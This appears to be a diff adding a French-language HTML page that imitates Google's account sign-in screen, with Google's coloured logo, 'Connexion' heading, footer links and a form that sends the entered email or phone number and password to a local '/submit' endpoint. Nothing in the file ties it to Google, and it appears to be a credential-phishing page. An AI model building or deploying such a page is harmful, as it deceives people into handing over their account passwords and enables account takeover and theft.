@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connexion - Comptes Google</title>
+<style>
+  body { margin: 0; font-family: Roboto, Arial, sans-serif; background: #fff;
+         display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 24px; }
+  .card { border: 1px solid #dadce0; border-radius: 8px; max-width: 450px; width: 100%;
+          padding: 48px 40px 36px; box-sizing: border-box; }
+  .logo { text-align: center; margin-bottom: 16px; font-size: 22px; font-weight: 400; color: #202124; }
+  .logo span { font-weight: 500; }
+  .logo .g1 { color: #4285f4; } .logo .g2 { color: #ea4335; }
+  .logo .g3 { color: #fbbc04; } .logo .g4 { color: #4285f4; }
+  .logo .g5 { color: #34a853; } .logo .g6 { color: #ea4335; }
+  h1 { font-size: 24px; font-weight: 400; text-align: center; margin: 0 0 8px 0; color: #202124; }
+  .subtitle { text-align: center; font-size: 16px; color: #202124; margin: 0 0 32px 0; }
+  label { display: block; font-size: 12px; color: #5f6368; margin-bottom: 4px; }
+  input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px;
+          font-size: 16px; box-sizing: border-box; margin-bottom: 8px; }
+  input:focus { outline: none; border-color: #1a73e8; border-width: 2px; padding: 12px 14px; }
+  .help { font-size: 14px; color: #1a73e8; margin: 8px 0 24px; cursor: pointer; }
+  .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
+  .create { color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer; }
+  button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px;
+           font-size: 14px; font-weight: 500; cursor: pointer; }
+  button:hover { background: #1765cc; }
+  .footer { display: flex; justify-content: space-between; max-width: 450px; width: 100%;
+            margin-top: 24px; font-size: 12px; color: #5f6368; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo"><span class="g1">G</span><span class="g2">o</span><span class="g3">o</span><span class="g4">g</span><span class="g5">l</span><span class="g6">e</span></div>
+  <h1>Connexion</h1>
+  <p class="subtitle">Utiliser votre compte Google</p>
+  <form method="POST" action="/submit">
+    <label for="email">Adresse e-mail ou numéro de téléphone</label>
+    <input type="text" id="email" name="email" required autofocus>
+    <div class="help">Adresse e-mail oubliée ?</div>
+    <label for="password">Saisissez votre mot de passe</label>
+    <input type="password" id="password" name="password" required>
+    <div class="actions">
+      <div class="create">Créer un compte</div>
+      <button type="submit">Suivant</button>
+    </div>
+  </form>
+</div>
+<div class="footer">
+  <span>Français (France) ▾</span>
+  <span>Aide · Confidentialité · Conditions</span>
+</div>
+</body>
+</html>
